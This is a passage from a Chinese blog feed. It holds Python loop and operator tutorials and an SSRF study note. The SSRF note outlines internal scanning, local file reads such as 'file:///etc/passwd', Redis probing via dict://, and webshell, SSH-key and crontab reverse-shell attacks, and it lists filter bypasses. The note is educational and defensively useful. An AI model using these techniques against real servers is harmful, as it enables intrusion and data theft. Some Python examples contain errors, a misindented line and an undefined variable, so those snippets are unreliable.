<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;循环没有被break,我将会被打印.&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;循环被break,我不会打印&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="三、for循环"><a href="#三、for循环" class="headerlink" title="三、for循环"></a>三、for循环</h1><h2 id="1、for循环"><a href="#1、for循环" class="headerlink" title="1、for循环"></a>1、for循环</h2><h3 id="（1）什么是for循环"><a href="#（1）什么是for循环" class="headerlink" title="（1）什么是for循环"></a>（1）什么是for循环</h3><p>循环就是重复做某件事，for循环是python提供的第二种循环机制<br>###（2）为何要有for循环<br>理论上for循环能做的事情，while循环都可以做，之所以要有for循环，是因为for循环在循环取值（遍历取值）🆚while循环更方便。<br>###（3）如何使用for循环<br>for循环语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量名 <span class="keyword">in</span> 可迭代对象: <span class="comment"># 可迭代对象可以是 字符串, 列表, 字典, 元组, 集合  range() 等...</span></span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="2、for循环实例"><a href="#2、for循环实例" class="headerlink" title="2、for循环实例"></a>2、for循环实例</h2><h3 id="（1）列表循环取值"><a href="#（1）列表循环取值" class="headerlink" title="（1）列表循环取值"></a>（1）列表循环取值</h3><h4 id="a、简单版："><a href="#a、简单版：" class="headerlink" title="a、简单版："></a>a、简单版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 循环取出lst中的三个值,并打印.</span></span><br><span class="line">lst = [<span class="string">&quot;lxx&quot;</span>,<span class="number">520</span>,<span class="string">&#x27;npy&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>for循环的执行流程是，当代码执行到for那局时，内部做的是把列表的第一个元素赋值给X，即x&#x3D;”XYG”,然后再执行循环体中的代码，循环体中的代码执行完成后会跳回到for那局，如果列表中海油元素的话，继续执行赋值操作，即x&#x3D;520，然后再执行循环体中的代码，如果没有元素了，for循环也就停止了，所以可以说for循环的次数取决于可迭代对象的元素的个数。<br>####b、复杂版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;xyg&quot;</span>,<span class="number">520</span>,<span class="string">&#x27;npy&#x27;</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(l[i])</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="（2）字典循环取值"><a href="#（2）字典循环取值" class="headerlink" title="（2）字典循环取值"></a>（2）字典循环取值</h3><h4 id="a、简单版"><a href="#a、简单版" class="headerlink" title="a、简单版"></a>a、简单版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;man&#x27;</span>:<span class="string">&quot;lxx&quot;</span>,<span class="string">&quot;love&quot;</span>:<span class="string">&quot;npy&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="built_in">print</span>(x,dic[x]) <span class="comment"># 通过coding发现字典循环取到的是键</span></span><br></pre></td></tr></table></figure><h4 id="b、复杂版"><a href="#b、复杂版" class="headerlink" title="b、复杂版"></a>b、复杂版</h4><p>while循环当然可以遍历字典了，但是太麻烦了。<br>###（3）字符串循环取值<br>####a、简单版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;pym love npy forever!&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> msg:</span><br><span class="line">    <span class="built_in">print</span>(x)  <span class="comment"># 注意for循环会循环字符串中的每个字符,空格也是一个字符.</span></span><br></pre></td></tr></table></figure><h4 id="b、复杂版-1"><a href="#b、复杂版-1" class="headerlink" title="b、复杂版"></a>b、复杂版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;lxx love npy forever!&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">21</span>:</span><br><span class="line">    <span class="built_in">print</span>(msg[i])</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="3、for循环和while循环的异同"><a href="#3、for循环和while循环的异同" class="headerlink" title="3、for循环和while循环的异同"></a>3、for循环和while循环的异同</h2><h3 id="（1）相同之处"><a href="#（1）相同之处" class="headerlink" title="（1）相同之处"></a>（1）相同之处</h3><p>都是循环，for循环可以做的事情，while循环也可以做<br>###（2）不同之处<br>while循环称之为条件循环，循环次数取决于条件何时变为假，for循环称之为”取值循环”，循环次数取决于in后包含的值的个数。<br>##4、for循环补充<br>当for循环是用于取值时，变量名可以出现在循环体中，当for循环只是为了循环次数，可以在循环体中不使用变量名，但是在for后，必须写变量名，这个是语法规定。<br>###（1）for+range<br>range是python提供一种内置的数据类型，就像字符串，列表等，都是python内置的数据类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">range</span>(stop) -&gt; <span class="built_in">range</span> <span class="built_in">object</span></span><br><span class="line">  结束</span><br><span class="line"><span class="built_in">range</span>(start, stop[, step]) -&gt; <span class="built_in">range</span> <span class="built_in">object</span></span><br><span class="line">   开始   结束   步长</span><br><span class="line"></span><br><span class="line"><span class="comment"># range有个特点就是顾头不顾尾</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)       <span class="comment"># 0,1,2,3,4</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 注意：py2中range返回的是一个列表</span></span><br><span class="line"><span class="comment">#   py3中返回的是一个对象</span></span><br></pre></td></tr></table></figure><p>通常情况下for循环喜欢和range（），搭配使用。<br>for+continue&#x2F;else&#x2F;break，其用法和while的是一毛一样的。<br>###（2）for循环嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 外层循环循环一次,内层循环需要完整的循环完毕</span></span><br><span class="line"><span class="comment"># for 循环的嵌套</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是外层循环---&gt;&#x27;</span>, i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是内存循环---&gt;&#x27;</span>, j)</span><br></pre></td></tr></table></figure><h3 id="（3）for循环退出"><a href="#（3）for循环退出" class="headerlink" title="（3）for循环退出"></a>（3）for循环退出</h3><p>while循环的退出有两种方式，但是for循环的话只有一种break方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">break</span>   <span class="comment"># 当i==7时,退出for循环 </span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h3 id="（4）for-continue"><a href="#（4）for-continue" class="headerlink" title="（4）for+continue"></a>（4）for+continue</h3><p>使用for循环+continue实现逢7跳过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">continue</span>   <span class="comment"># 当i==7时,跳过本次循环</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h3 id="（5）for-else"><a href="#（5）for-else" class="headerlink" title="（5）for+else"></a>（5）for+else</h3><p>当for循环，循环接收，没有break退出就会进入else分支，如果在循环中出现了break，就不会走else：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">break</span>   </span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;for循环结束没有break&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;for循环结束没有break&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞的学习</title>
      <link href="/2022/04/07/ssrf_study/"/>
      <url>/2022/04/07/ssrf_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。<br>#二、漏洞原理<br>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。<br>例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的web应用作为代理攻击远程和本地的服务器。<br>&#x3D;&#x3D;一句话就是：利用一个可以发起网络请求的服务当做跳板来攻击内部其他服务。&#x3D;&#x3D;<br>主要攻击方式如下所示：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（如：readme文件）</li><li>攻击内外网的web应用，主要是使用GET参数就可以实现的攻击（如：Struts2，sqli）</li><li>下载内网资源（如：利用file协议读取本地文件等）</li><li>进行跳板</li><li>无视CDN</li><li>利用Redis未授权访问，HTTP，CRLF注入实现getshell。</li></ol><h1 id="三、漏洞种类"><a href="#三、漏洞种类" class="headerlink" title="三、漏洞种类"></a>三、漏洞种类</h1><h2 id="1、显示对攻击者的响应（Basic）"><a href="#1、显示对攻击者的响应（Basic）" class="headerlink" title="1、显示对攻击者的响应（Basic）"></a>1、显示对攻击者的响应（Basic）</h2><p>它显示对攻击者的响应，因此在服务器获取攻击者要求的URL后，它将把响应发送回攻击者，返回结果到客户端，如传送一个网址，会返回这个网址的界面和对应的html代码。<br>##2、不显示响应（Blind）<br>和上面正好相反，不会返回结果到客户端，当你从未从初始请求中获取有关目标服务的任何信息时，就会发生这种ssrf。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSbin等类似工具，这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的，这种ssrf通常易于验证，但难以利用。<br>##3、Semi-ssrf<br>与Blind相似，这种ssrf不会返回相关结果请求的所有详细信息，但是会暴露一些数据，这可能是部分数据或错误信息，他们为攻击者提供了更多信息。<br>有时，关于请求的元数据（例如响应时间）也可以视为Semi-ssrf，因此它们允许攻击者验证请求是否成功，这种ssrf通常足以验证漏洞，但并不总是能提取敏感数据。<br>#四、漏洞寻找<br>能够对外发起网络请求的地方，就可以存在SSRF漏洞。</p><ol start="9"><li>转码服务</li><li>在线翻译</li><li>图片加载与下载（通过URL地址加载或下载图片）</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方</li><li>头像的地方（远程加载头像）</li><li>一切要你输入网址的地方和考研输入ip的地方</li><li>从URL关键词中找，share、wap、url、link、src、source、target等<br>简单说说关于SSRF漏洞验证，可以尝试</li></ol><h2 id="1、排除法：查看是否是在本地进行了请求"><a href="#1、排除法：查看是否是在本地进行了请求" class="headerlink" title="1、排除法：查看是否是在本地进行了请求"></a>1、排除法：查看是否是在本地进行了请求</h2><h2 id="2、使用dnslog等平台进行测试，看是否有ip"><a href="#2、使用dnslog等平台进行测试，看是否有ip" class="headerlink" title="2、使用dnslog等平台进行测试，看是否有ip"></a>2、使用dnslog等平台进行测试，看是否有ip</h2><h2 id="3、burpsuite抓包，分析发送的请求是不是通过服务端发送的，因为SSRF要求是从服务端发起的请求，本地请求中不应该包含存在对资源的请求。"><a href="#3、burpsuite抓包，分析发送的请求是不是通过服务端发送的，因为SSRF要求是从服务端发起的请求，本地请求中不应该包含存在对资源的请求。" class="headerlink" title="3、burpsuite抓包，分析发送的请求是不是通过服务端发送的，因为SSRF要求是从服务端发起的请求，本地请求中不应该包含存在对资源的请求。"></a>3、burpsuite抓包，分析发送的请求是不是通过服务端发送的，因为SSRF要求是从服务端发起的请求，本地请求中不应该包含存在对资源的请求。</h2><h1 id="五、漏洞相关函数"><a href="#五、漏洞相关函数" class="headerlink" title="五、漏洞相关函数"></a>五、漏洞相关函数</h1><p>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞。<br>##1、file_get_contents()<br>这个函数的作用是将整个文件读入一个字符串中，并且次函数是用于把文件的内容读入到一个字符串中的首选方法。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b4e111f7ae864182884ee69969bec614.png" alt="在这里插入图片描述"><br>从用户指定的url获取图片，保存在电脑上<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1ef01a2fdf0c4d8999fa3d91ab3ca821.png" alt="在这里插入图片描述"></p><h2 id="2、fsockopen"><a href="#2、fsockopen" class="headerlink" title="2、fsockopen()"></a>2、fsockopen()</h2><p>fsockopen()函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器简历tcp连接，传输数据。变量host为主机名，errstr表示错误信息将以字符串的信息返回，30为时限。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/50a583a8ede94afea824d47ed007aef2.png" alt="在这里插入图片描述"></p><h2 id="3、curl-exec（）"><a href="#3、curl-exec（）" class="headerlink" title="3、curl_exec（）"></a>3、curl_exec（）</h2><p>curl_exec（）函数用于执行指定的cURL会话<br><img src="http://120.48.107.243:9090/blog/2023/04/03/97f1cecc67da4013a27268b0d74cb262.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;注意&#x3D;&#x3D;<br> 1.一般情况下PHP不会开启fopen的gopher wrapper<br> 2.file_get_contents的gopher协议不能URL编码<br> 3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br> 4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断)经测试7.49可用<br> 5.curl_exec()<br> 6.file_get_contents()</p><h1 id="六、协议"><a href="#六、协议" class="headerlink" title="六、协议"></a>六、协议</h1><h2 id="1、file-x2F-x2F"><a href="#1、file-x2F-x2F" class="headerlink" title="1、file:&#x2F;&#x2F;"></a>1、file:&#x2F;&#x2F;</h2><p>在有回显的情况下，利用file协议可以读取任意文件内容<br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>##2、dict:&#x2F;&#x2F;<br>字典服务器协议，访问字典资源，泄露安装软件版本信息，查看端口，操作内网redis服务等<br>dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info<br>##3、gopher:&#x2F;&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7b2f5883d04d44cebe250cdc25113a13.png" alt="在这里插入图片描述"></p><h2 id="4、http-x2F-s"><a href="#4、http-x2F-s" class="headerlink" title="4、http&#x2F;s"></a>4、http&#x2F;s</h2><p> 探测内网主机存活<br>#七、curl<br>curl是常用的命令行工具，用来请求web服务器，它的名字就是客户端的URL工具的意思。<br>curl -V查看curl支持的协议列表<br>-v参数输出通信的整个过程<br>#八、远程利用<br>##1、利用file协议<br>##2、利用dict协议<br>##3、利用gopher协议<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3c6de7dc7f3e417f9d165207d0c998eb.png" alt="在这里插入图片描述"></p><h2 id="4、利用http-x2F-s协议"><a href="#4、利用http-x2F-s协议" class="headerlink" title="4、利用http&#x2F;s协议"></a>4、利用http&#x2F;s协议</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b194dc6ab7f94c828aa18c0ee6675bc6.png" alt="在这里插入图片描述"></p><h1 id="九、redis未授权-ssrf"><a href="#九、redis未授权-ssrf" class="headerlink" title="九、redis未授权+ssrf"></a>九、redis未授权+ssrf</h1><p>redis常见的SSRF攻击方式大概有以下三种：<br>1.绝对路径写webshell<br>2.写ssh公钥<br>3.写contrab计划任务反弹shell<br>##绝对路径写webshell<br>这个方法比较常用，也是用的最多的。<br>###构造payload<br><img src="http://120.48.107.243:9090/blog/2023/04/03/29c8abcf9b124b8292f03c6de3483997.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/1ece5ad01a3d4c0e8f3be1e22a03e9b8.png" alt="在这里插入图片描述"></p><h1 id="十、相关绕过"><a href="#十、相关绕过" class="headerlink" title="十、相关绕过"></a>十、相关绕过</h1><h2 id="1、攻击本地"><a href="#1、攻击本地" class="headerlink" title="1、攻击本地"></a>1、攻击本地</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2b01b8f4512e4195a008cffbb3c1711e.png" alt="在这里插入图片描述"></p><h2 id="2、利用【：：】"><a href="#2、利用【：：】" class="headerlink" title="2、利用【：：】"></a>2、利用【：：】</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5449d161baaf44cf82cb790f8b8d15df.png" alt="在这里插入图片描述"></p><h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用@"></a>3、利用@</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/5489a2fa30c04e71aba642eafef55304.png" alt="在这里插入图片描述"></p><h2 id="4、利用短地址"><a href="#4、利用短地址" class="headerlink" title="4、利用短地址"></a>4、利用短地址</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7f52758185ce4fe399cc078f8a1e5d5d.png" alt="在这里插入图片描述"></p><h2 id="5、利用特殊域名"><a href="#5、利用特殊域名" class="headerlink" title="5、利用特殊域名"></a>5、利用特殊域名</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d0330bd7071a4acdb778aec24621fed0.png" alt="在这里插入图片描述"></p><h2 id="6、利用DNS解析"><a href="#6、利用DNS解析" class="headerlink" title="6、利用DNS解析"></a>6、利用DNS解析</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e73c442de8a04dfeb2249c3f129ed96c.png" alt="在这里插入图片描述"></p><h2 id="7、利用进制转换"><a href="#7、利用进制转换" class="headerlink" title="7、利用进制转换"></a>7、利用进制转换</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4d41ed0417934ea7a46e90aa76276522-20230403142609337.png" alt="在这里插入图片描述"></p><h2 id="8、句号"><a href="#8、句号" class="headerlink" title="8、句号"></a>8、句号</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/814bfdec440245daa90e702d6cec3b06.png" alt="在这里插入图片描述"><br>#十一、总结与后记<br>本篇文章是关于SSRF的学习笔记，请勿用作违规。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> SSRF漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> SSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（六）</title>
      <link href="/2022/04/06/python_six/"/>
      <url>/2022/04/06/python_six/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140118631.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python运算符知识。&#x3D;&#x3D;</p><h1 id="一、算术运算符"><a href="#一、算术运算符" class="headerlink" title="一、算术运算符"></a>一、算术运算符</h1><h2 id="1、什么是算数运算符"><a href="#1、什么是算数运算符" class="headerlink" title="1、什么是算数运算符"></a>1、什么是算数运算符</h2><p>就是做加减乘除四则运算以及其他的复杂运算的, 让计算机能像人一样可以做计算</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">相加</td></tr><tr><td align="center">-</td><td align="center">相减</td></tr><tr><td align="center">*</td><td align="center">相乘</td></tr><tr><td align="center">&#x2F;</td><td align="center">相除 (有小数部分,结果全是float类型)</td></tr><tr><td align="center">&#x2F;&#x2F;</td><td align="center">地板除 (只保留整数部分)</td></tr><tr><td align="center">%</td><td align="center">取余&#x2F;取模 (只保留余数)</td></tr><tr><td align="center">**</td><td align="center">幂运算</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span>/<span class="number">2</span>) <span class="comment"># 5.0 float类型</span></span><br></pre></td></tr></table></figure><p>重点提一嘴</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 // 3   ==&gt; 3</span><br><span class="line">10 % 3   ==&gt; 1</span><br><span class="line">2 ** 3     ==&gt; 8</span><br></pre></td></tr></table></figure><h1 id="二、-比较运算符"><a href="#二、-比较运算符" class="headerlink" title="二、 比较运算符"></a>二、 比较运算符</h1><h2 id="1、-什么是比较运算符"><a href="#1、-什么是比较运算符" class="headerlink" title="1、 什么是比较运算符"></a>1、 什么是比较运算符</h2><p>就是做比较运算的, 让计算机能像人一样可以做比较</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&gt;&#x3D;</td><td align="center">大于等于</td></tr><tr><td align="center">&lt;&#x3D;</td><td align="center">小于等于</td></tr><tr><td align="center">&#x3D;&#x3D;</td><td align="center">等于</td></tr><tr><td align="center">!&#x3D;</td><td align="center">不等于</td></tr></tbody></table><h1 id="三、-赋值运算符"><a href="#三、-赋值运算符" class="headerlink" title="三、 赋值运算符"></a>三、 赋值运算符</h1><h2 id="1、-什么是赋值运算符"><a href="#1、-什么是赋值运算符" class="headerlink" title="1、 什么是赋值运算符"></a>1、 什么是赋值运算符</h2><p>就是做赋值操作的, 让计算机能像人一样给一个事物附上一个值, 记录下来</p><h3 id="（1）-增量赋值"><a href="#（1）-增量赋值" class="headerlink" title="（1） 增量赋值"></a>（1） 增量赋值</h3><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&#x3D;</td><td align="center">变量的赋值</td></tr><tr><td align="center">+&#x3D;</td><td align="center">加等于</td></tr><tr><td align="center">-&#x3D;</td><td align="center">减等于</td></tr><tr><td align="center">*&#x3D;</td><td align="center">乘等于</td></tr><tr><td align="center">&#x2F;&#x3D;</td><td align="center">除等于</td></tr><tr><td align="center">&#x2F;&#x2F;&#x3D;</td><td align="center">取整等于</td></tr><tr><td align="center">%&#x3D;</td><td align="center">取余等于</td></tr><tr><td align="center">**&#x3D;</td><td align="center">幂等于</td></tr></tbody></table><p>提一嘴 , 你在python会经常见到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x += 1  等价于 x = x +1</span><br></pre></td></tr></table></figure><h3 id="（2）交叉赋值"><a href="#（2）交叉赋值" class="headerlink" title="（2）交叉赋值"></a>（2）交叉赋值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">y = <span class="number">20</span></span><br><span class="line">x,y = y,x</span><br></pre></td></tr></table></figure><h3 id="（3）-链式赋值"><a href="#（3）-链式赋值" class="headerlink" title="（3） 链式赋值"></a>（3） 链式赋值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=y=z = <span class="number">10</span></span><br><span class="line"><span class="comment"># 把栈区中的10的内存地址分别赋值给x,y,z</span></span><br></pre></td></tr></table></figure><h3 id="（4）-解压赋值"><a href="#（4）-解压赋值" class="headerlink" title="（4） 解压赋值"></a>（4） 解压赋值</h3><p>一般适合在取开头前几个或者末尾几个数据的值，不适合取数据量大的容器的中间值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x,y = [<span class="number">10</span>,<span class="number">20</span>]</span><br><span class="line"><span class="built_in">print</span>(x)   <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(y)   <span class="comment"># 20</span></span><br></pre></td></tr></table></figure><h1 id="四、-逻辑运算符"><a href="#四、-逻辑运算符" class="headerlink" title="四、 逻辑运算符"></a>四、 逻辑运算符</h1><h2 id="1、-逻辑运算"><a href="#1、-逻辑运算" class="headerlink" title="1、 逻辑运算"></a>1、 逻辑运算</h2><p>所谓的逻辑运算，你可以先简单的认为就是判断，比如今天下不下雨，下雨。这就一个判断。</p><h2 id="2、-逻辑运算符"><a href="#2、-逻辑运算符" class="headerlink" title="2、 逻辑运算符"></a>2、 逻辑运算符</h2><p>逻辑运算符就是用来把多个条件连在一起做判断的符号</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>not</td><td>非(取反)</td></tr><tr><td>and</td><td>与</td></tr><tr><td>or</td><td>或</td></tr></tbody></table><h3 id="（1）-not"><a href="#（1）-not" class="headerlink" title="（1） not"></a>（1） not</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># not: 就是把紧跟其后的那个条件结果取反</span></span><br><span class="line"><span class="comment"># not与紧跟其后的那个条件是一个不可分割的整体</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="number">16</span> &gt; <span class="number">13</span>) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="number">0</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="（2）and"><a href="#（2）and" class="headerlink" title="（2）and"></a>（2）and</h3><p>and（逻辑与）用来连接左右两个条件。两个条件同时为真，最终结果才为真。如果连接多个条件, 条件全为真, 最终结果才是True.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> 